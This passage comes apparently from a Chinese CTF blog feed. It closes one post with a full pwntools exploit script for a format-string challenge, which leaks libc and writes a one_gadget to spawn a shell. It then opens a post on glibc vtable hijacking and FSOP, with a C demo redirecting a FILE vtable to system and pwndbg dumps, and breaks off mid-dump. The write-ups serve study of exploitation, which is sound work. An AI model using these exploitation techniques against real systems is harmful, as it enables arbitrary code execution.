class="code"><pre><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret - <span class="number">90</span>).encode() + <span class="string">b&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>而换个偏移方式，这样却能同时修改成功，非常诡异，需要探究一下，见<a href="https://r3t2.top/2025/09/08/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8Eprintf%E4%B8%AD%E5%A4%84%E7%90%86fmtstr%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">另一篇博客</a><br>那么我们只能修改<code>printf</code>的返回地址，如果要修改其为<code>one_gadget</code>的话是不行的，因为我们打指针跳板要一部分一部分的改，需要多次<code>printf</code>正常返回到<code>read</code>，来进行多次利用，所以我们在<code>printf</code>的返回地址的下一个栈单元布置<code>one_gadget</code>，最后布置完后修改<code>printf</code>返回到<code>ret</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000012C4                 retn</span><br></pre></td></tr></table></figure><p>找到我们方便改写的<code>ret</code>地址，最后exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6_2.31-0ubuntu9.18_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6-dbg_2.31-0ubuntu9.18_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/glibc-source_2.31-0ubuntu9.18_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9--libc_base-ret 13--elf_base 11--p2 39--p1 27--p1&#x27; 41--p2&#x27;</span></span><br><span class="line"></span><br><span class="line">main_offset = <span class="number">0x11a9</span></span><br><span class="line">read_offset = <span class="number">0x1223</span></span><br><span class="line">fini_array = <span class="number">0x3d90</span></span><br><span class="line">bss_offset = <span class="number">0x4040</span></span><br><span class="line">return_offset = <span class="number">0x1250</span></span><br><span class="line">libc_offset = <span class="number">243</span> + libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Gift: &#x27;</span>)</span><br><span class="line">leak_stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">4</span>), <span class="number">16</span>)</span><br><span class="line">printf_ret = leak_stack_addr - <span class="number">0xc</span></span><br><span class="line">target = leak_stack_addr - <span class="number">0x4</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret - <span class="number">90</span>).encode() + <span class="string">b&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - libc_offset</span><br><span class="line">log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r15] == NULL || r15 == NULL || r15 is a valid argv</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put ogg to stack</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((one_gadget &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target + <span class="number">2</span> - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(target + <span class="number">4</span> - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%27$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&quot;%41$hn&quot;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xc4</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span> <span class="comment"># return to &#x27;ret&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> fmtstr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持vtable以及FSOP</title>
      <link href="/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/"/>
      <url>/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>参考博客<br><a href="https://xz.aliyun.com/news/5139">IO FILE 之劫持vtable及FSOP-先知社区</a><br><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/144964917">【我的 PWN 学习手札】IO_FILE 之 FSOP_fsop pwn-CSDN博客</a><br><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/145820668">【我的 PWN 学习手札】IO_FILE 之 劫持vtable到_IO_str_jumps_pwn vtable-CSDN博客</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/123810198?spm=1001.2014.3001.5501">linux IO_FILE 利用_io list all结构体-CSDN博客</a><br>因为vtable check机制的引入，直接劫持vtable和简单的FSOP在glibc2.24+就已经失效了，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK     0xFFFF0000</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    _IO_vtable_check();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有当 vtable 指针位于 __io_vtables 段内时，才算“合法”，否则进入慢路径进一步检查或 abort()</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Shared glibc 中，如果 accept flag 被设置为 __IO_vtable_check 本身，则跳过</span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 或者跨 namespace 使用动态加载，也可能绕过</span></span><br><span class="line">  <span class="keyword">if</span> (within dlopen context) <span class="keyword">return</span>;</span><br><span class="line">  __libc_fatal(<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以要继续进行利用就需要结合其他更间接高级的技巧<br>姑且先记录一下基础利用吧</p><h2 id="0x01-劫持vtable"><a href="#0x01-劫持vtable" class="headerlink" title="0x01 劫持vtable"></a>0x01 劫持vtable</h2><p>在此前已经介绍过<code>vtable</code>，它存放着IO函数进行IO操作时候会调用的一些函数指针<br>如果能够控制<code>_IO_FILE_plus</code>结构体，实现对<code>vtable</code>指针的修改，使得<code>vtable</code>指向可控的内存，在该内存中构造好<code>vtable</code>，再通过调用相应IO函数，触发<code>vtable</code>函数的调用，即可劫持程序执行流<br>而要劫持<code>vtable</code>，一般有两种方式：一是直接修改（一般<code>vtable</code>都是不可写入的），二是伪造整个<code>_IO_FILE_plus</code>或者修改<code>vtable</code>指针。<br>在64位系统下<code>vtable</code>在<code>_IO_FILE_plus</code>中的偏移为0xd8。<code>vtable</code>中的函数调用时候都会把<code>_IO_FILE_plus</code>指针作为参数，故而只需要在<code>_IO_FILE_plus</code>头部写入<code>&#39;sh\x00&#39;</code>或者<code>&#39;bin/sh\x00&#39;</code>，再劫持<code>vtable</code>中对应的函数为<code>system</code>函数即可。<br>也可以直接劫持为<code>one_gadget</code><br>接下来写个demo运行验证一下（ glibc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=&amp;system; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先查看fp指针指向的新建的<code>_IO_FILE_plus</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fp</span><br><span class="line">$6 = (FILE *) 0x5ecb5d787010</span><br><span class="line">pwndbg&gt; x/30gx 0x5ecb5d787010</span><br><span class="line">0x5ecb5d787010: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x5ecb5d787020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787070: 0x0000000000000000      0x0000721dfecd3540</span><br><span class="line">0x5ecb5d787080: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x5ecb5d787090: 0x0000000000000000      0x00005ecb5d7870f0</span><br><span class="line">0x5ecb5d7870a0: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x5ecb5d7870b0: 0x00005ecb5d787100      0x0000000000000000</span><br><span class="line">0x5ecb5d7870c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870e0: 0x0000000000000000      0x0000721dfecd16e0</span><br><span class="line">0x5ecb5d7870f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/22gx 0x0000721dfecd16e0</span><br><span class="line">0x721dfecd16e0 &lt;_IO_file_jumps&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x721dfecd16f0 &lt;_IO_file_jumps+16&gt;:     0x0000721dfe9879d0      0x0000721dfe988740</span><br><span class="line">0x721dfecd1700 &lt;_IO_file_jumps+32&gt;:     0x0000721dfe9884b0      0x0000721dfe989610</span><br><span class="line">0x721dfecd1710 &lt;_IO_file_jumps+48&gt;:     0x0000721dfe98a990      0x0000721dfe9871f0</span><br><span class="line">0x721dfecd1720 &lt;_IO_file_jumps+64&gt;:     0x0000721dfe986ed0      0x0000721dfe9864d0</span><br><span class="line">0x721dfecd1730 &lt;_IO_file_jumps+80&gt;:     0x0000721dfe989a10      0x0000721dfe986440</span><br><span class="line">0x721dfecd1740 &lt;_IO_file_jumps+96&gt;:     0x0000721dfe986380      0x0000721dfe97b190</span><br><span class="line">0x721dfecd1750 &lt;_IO_file_jumps+112&gt;:    0x0000721dfe9871b0      0x0000721dfe986b80</span><br><span class="line">0x721dfecd1760 &lt;_IO_file_jumps+128&gt;:    0x0000721dfe986980      0x0000721dfe986350</span><br><span class="line">0x721dfecd1770 &lt;_IO_file_jumps+144&gt;:    0x0000721dfe986b70      0x0000721dfe98ab00</span><br><span class="line">0x721dfecd1780 &lt;_IO_file_jumps+160&gt;:    0x0000721dfe98ab10      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到此时<code>fp+0xd8</code>处即0x5ecb5d787010+0xd8&#x3D;0x5ecb5d7870e8处此时还是正常的<code>vtable</code><br>接下来执行<code> vtable_addr[0]=(long long)fake_vtable;</code>，将<code>vtable</code>指针修改到可控的chunk地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_vtable</span><br><span class="line">$7 = (long long *) 0x5ecb5d787240</span><br><span class="line">pwndbg&gt; x/30gx 0x5ecb5d787010</span><br><span class="line">0x5ecb5d787010: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x5ecb5d787020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787070: 0x0000000000000000      0x0000721dfecd3540</span><br><span class="line">0x5ecb5d787080: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x5ecb5d787090: 0x0000000000000000      0x00005ecb5d7870f0</span><br><span class="line">0x5ecb5d7870a0: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x5ecb5d7870b0: 0x00005ecb5d787100      0x0000000000000000</span><br><span class="line">0x5ecb5d7870c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870e0: 0x0000000000000000      0x00005ecb5d787240</span><br><span class="line">0x5ecb5d7870f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/22gx 0x00005ecb5d787240</span><br><span class="line">0x5ecb5d787240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787250: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787280: 0x0000000000000000      0x0000000000020d81</span><br><span class="line">0x5ecb5d787290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872e0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到此时<code>fp+0xd8</code>处已经变成了我们申请的chunk地址（0x5ecb5d787240）<br>接下来将“&#x2F;bin&#x2F;sh”写入fp，并修改fake_vtable中的<code>__xsputn</code>函数指针（第八表项，具体见我记录<code>_IO_FILE</code>基础知识的<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">博客</a>中关于虚表的笔记）为system地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/22gx 0x00005ecb5d787240</span><br><span class="line">0x5ecb5d787240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787250: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787270: 0x0000000000000000      0x0000721dfe9533a0</span><br><span class="line">0x5ecb5d787280: 0x0000000000000000      0x0000000000020d81</span><br><span class="line">0x5ecb5d787290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872e0: 0x0000000000000000      